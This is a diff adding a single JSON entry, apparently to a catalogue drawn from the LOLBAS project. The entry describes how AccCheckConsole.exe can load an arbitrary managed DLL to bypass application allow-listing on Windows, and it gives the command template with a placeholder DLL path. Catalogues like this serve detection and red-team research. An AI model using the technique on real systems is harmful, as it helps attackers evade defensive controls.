@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-acccheckconsole-exe-awl-bypass",
+  "name": "LOLBAS · AccCheckConsole.exe (AWL Bypass)",
+  "command": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}",
+  "description": "Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "acccheckconsole",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/AccCheckConsole/",
+  "upstream_id": "AccCheckConsole.exe/AWL Bypass/0",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — AccCheckConsole.exe",
+      "url": "https://lolbas-project.github.io/lolbas/AccCheckConsole/"
+    }
+  ]
+}
